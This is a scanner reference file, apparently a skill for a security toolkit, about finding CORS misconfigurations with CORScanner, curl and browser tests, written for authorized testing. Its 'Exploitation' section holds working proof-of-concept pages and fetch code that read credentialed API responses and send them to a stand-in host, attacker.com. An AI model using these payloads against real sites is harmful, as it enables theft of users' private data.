---
name: cors-check
category: scanner
tags:
  - cors
  - misconfiguration
  - origin-bypass
  - cross-origin
  - access-control
  - web-security
triggers:
  - cors misconfiguration
  - cors bypass
  - origin header
  - access control allow origin
  - cross origin vulnerability
  - cors scan
  - cors check
os: cross-platform
---

# CORS-CHECK

## Purpose

Detect Cross-Origin Resource Sharing (CORS) misconfigurations that allow unauthorized cross-origin data access. CORS misconfigurations can lead to sensitive data theft, credential exposure, and account takeover when attackers exploit permissive access control policies.

## Tools

### CORScanner

- **Description**: Fast Python-based CORS misconfiguration scanner
- **Version**: 1.0.1
- **Language**: Python
- **Install**: `pip install corscanner` or `pip install cors`
- **GitHub**: https://github.com/chenjj/CORScanner

### Manual Testing

- **Tools**: curl, Burp Suite, browser DevTools
- **Purpose**: Validate findings, test edge cases
- **Approach**: Custom Origin header manipulation

## Installation

### CORScanner Installation

```bash
# Install via pip (recommended)
pip install corscanner

# Alternative short name
pip install cors

# Install from source
git clone https://github.com/chenjj/CORScanner.git
cd CORScanner
pip install -r requirements.txt
```

### Verify Installation

```bash
# Check CLI availability
cors --help

# Or use Python module
python -c "from CORScanner.cors_scan import cors_check; print('CORScanner ready')"
```

### Dependencies

```bash
# CORScanner requires
pip install requests gevent tldextract colorama argparse

# For SOCKS proxy support
pip install PySocks
```

## CLI Reference

### CORScanner Options

```
Usage: cors [options]

Options:
  -u, --url URL         Target URL/domain to check
  -i, --input FILE      File with URLs/domains (one per line)
  -o, --output FILE     Save results to JSON file
  -t, --threads NUM     Number of concurrent threads
  -v, --verbose         Enable verbose output
  -T, --timeout SEC     Request timeout (default: 10)
  -p, --proxy URL       HTTP or SOCKS5 proxy
  -d, --headers STR     Custom headers (e.g., "Cookie: test")
  -h, --help            Show help message
```

## Misconfiguration Types

### Reflect_any_origin (CRITICAL)

Server blindly reflects Origin header in Access-Control-Allow-Origin response.

**Impact**: Any website can read sensitive data via cross-origin requests.

**Detection Pattern**:

```
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true
```

### Trust_null (HIGH)

Server allows null origin, exploitable via sandboxed iframes.

**Impact**: Attacker can forge null origin and access protected resources.

**Detection Pattern**:

```
Request:  Origin: null
Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true
```

### Prefix_match (HIGH)

Weak validation allows attacker-controlled subdomains.

**Example**: `example.com` trusts `example.com.evil.com`

### Suffix_match (HIGH)

Validation only checks domain suffix.

**Example**: `example.com` trusts `evilexample.com`

### Not_escape_dot (MEDIUM)

Regex doesn't escape dots, allowing character substitution.

**Example**: `www.example.com` trusts `wwwaexample.com`

### Substring_match (MEDIUM)

Validation only checks for substring presence.

**Example**: `example.com` trusts `example.co`

### HTTPS_trust_HTTP (MEDIUM)

HTTPS site accepts origins from HTTP sites.

**Impact**: MITM attacker can steal secrets from HTTPS endpoints.

### Trust_any_subdomain (MEDIUM)

Trusts all subdomains, vulnerable if any subdomain has XSS.

**Example**: XSS on `sub.example.com` can steal from `api.example.com`

### Custom_third_parties (MEDIUM)

Trusts untrusted third-party origins like github.io.

**Impact**: Attacker pages on shared platforms can access resources.

### Special_characters_bypass (LOW-MEDIUM)

Exploits browser handling of special characters in domain names.

**Characters**: `_` (Chrome/Firefox), `}` `{` (Safari)

## Workflows

### Basic Single Target Scan

```bash
# Scan single domain
cors -u https://example.com -v

# Scan specific endpoint
cors -u https://example.com/api/user -v

# Save results to JSON
cors -u https://example.com -v -o cors_results.json
```

### Bulk Target Scanning

```bash
# Create target list
cat > targets.txt << 'EOF'
https://api.target1.com
https://api.target2.com/v1
https://target3.com/graphql
EOF

# Scan multiple targets
cors -i targets.txt -t 50 -v -o bulk_cors_scan.json
```

### Scanning with Proxy

```bash
# HTTP proxy (for Burp Suite)
cors -u https://example.com -p http://127.0.0.1:8080 -v

# SOCKS5 proxy
cors -u https://example.com -p socks5://127.0.0.1:9050 -v
```

### Authenticated Scanning

```bash
# With session cookie
cors -u https://example.com/api/private -d "Cookie: session=abc123" -v

# With authorization header
cors -u https://example.com/api/user -d "Authorization: Bearer token123" -v
```

### Using as Python Library

```python
from CORScanner.cors_scan import cors_check

# Check single URL
result = cors_check("https://example.com", None)
print(result)

# Output structure
# {
#   'url': 'https://example.com',
#   'type': 'reflect_origin',
#   'credentials': 'true',
#   'origin': 'https://evil.com',
#   'status_code': 200
# }
```

## Manual Testing Techniques

### curl Testing

```bash
# Test origin reflection
curl -s -I -H "Origin: https://evil.com" https://target.com/api | grep -i "access-control"

# Test null origin
curl -s -I -H "Origin: null" https://target.com/api | grep -i "access-control"

# Test subdomain trust
curl -s -I -H "Origin: https://attacker.target.com" https://target.com/api | grep -i "access-control"

# Test prefix bypass
curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api | grep -i "access-control"

# Test suffix bypass
curl -s -I -H "Origin: https://eviltarget.com" https://target.com/api | grep -i "access-control"

# Test special characters (Chrome/Firefox)
curl -s -I -H "Origin: https://target.com_.evil.com" https://target.com/api | grep -i "access-control"
```

### Browser DevTools Testing

```javascript
// Console test for CORS
fetch("https://target.com/api/sensitive", {
  method: "GET",
  credentials: "include",
})
  .then((response) => response.json())
  .then((data) => console.log("CORS vulnerable:", data))
  .catch((error) => console.log("CORS protected:", error));
```

## Exploitation

### Reflect_any_origin PoC

```html
<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC - Origin Reflection</title>
  </head>
  <body>
    <h1>CORS Vulnerability PoC</h1>
    <div id="result">Loading...</div>

    <script>
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            document.getElementById("result").innerHTML =
              "<pre>" + xhr.responseText + "</pre>";
            // In real attack: send to attacker server
            // new Image().src = 'https://attacker.com/log?data=' +
            //     encodeURIComponent(xhr.responseText);
          }
        }
      };
      xhr.open("GET", "https://vulnerable.com/api/sensitive", true);
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </body>
</html>
```

### Null Origin PoC (Sandboxed iframe)

```html
<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC - Null Origin</title>
  </head>
  <body>
    <h1>Null Origin CORS Attack</h1>

    <iframe
      sandbox="allow-scripts allow-top-navigation allow-forms"
      srcdoc="
    <script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
        // Exfiltrate data
        top.location = 'https://attacker.com/log?data=' +
            encodeURIComponent(this.responseText);
    };
    xhr.open('GET', 'https://vulnerable.com/api/sensitive', true);
    xhr.withCredentials = true;
    xhr.send();
    </script>
    "
    ></iframe>
  </body>
</html>
```

### Fetch API Exploitation

```javascript
// Modern fetch-based exploitation
async function exploitCORS(targetUrl) {
  try {
    const response = await fetch(targetUrl, {
      method: "GET",
      credentials: "include",
      headers: {
        Accept: "application/json",
      },
    });

    if (response.ok) {
      const data = await response.text();
      console.log("[+] CORS Vulnerable! Data:", data);

      // Exfiltrate
      await fetch("https://attacker.com/collect", {
        method: "POST",
        body: JSON.stringify({
          url: targetUrl,
          data: data,
        }),
      });
    }
  } catch (error) {
    console.log("[-] CORS protected:", error.message);
  }
}

// Usage
exploitCORS("https://vulnerable.com/api/user/profile");
```

## Output Parsing

### Parse Results with jq

```bash
# Extract vulnerable URLs
cat cors_results.json | jq -r 'select(.type != null) | .url'

# Filter by misconfiguration type
cat cors_results.json | jq -r 'select(.type == "reflect_origin") | .url'

# Get critical findings (credentials = true)
cat cors_results.json | jq -r 'select(.credentials == "true") | "\(.url) - \(.type)"'
```

## Integration Patterns

### Pipeline Integration

```bash
# Subdomain enumeration -> CORS scan
subfinder -d target.com -silent | httpx -silent | cors -i /dev/stdin -t 100 -o cors_scan.json

# API endpoint scanning
cat api_endpoints.txt | cors -i /dev/stdin -d "Cookie: session=abc" -v -o api_cors.json
```

## Validation Checklist

### Before Reporting

1. **Confirm vulnerability**: Test manually with curl, verify credentials: true
2. **Determine impact**: What sensitive data is accessible?
3. **Create working PoC**: Build HTML exploitation page
4. **Check false positives**: Public APIs may intentionally allow any origin

## Troubleshooting

### Common Issues

```bash
# No CORS headers - try with credentials
curl -s -I -H "Origin: https://evil.com" -H "Cookie: session=abc" https://target.com/api

# CORScanner not detecting - increase verbosity and timeout
cors -u https://target.com -v -T 30

# Test specific endpoint not just domain
cors -u https://target.com/api/v1/user -v

# For SOCKS5 proxy, install PySocks
pip install PySocks
```

## Security Considerations

- Only test authorized targets
- Don't exfiltrate actual user data
- Use console.log() not actual exfiltration in PoCs
- Report findings through proper channels
- Follow program scope rules

## References

- CORScanner GitHub: https://github.com/chenjj/CORScanner
- CORS Paper: https://www.jianjunchen.com/p/CORS-USESEC18.pdf
- PortSwigger CORS: https://portswigger.net/web-security/cors
- HackTricks CORS: https://book.hacktricks.wiki/pentesting-web/cors-bypass.html
- Advanced CORS Techniques: https://www.corben.io/advanced-cors-techniques/
- James Kettle CORS Research: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
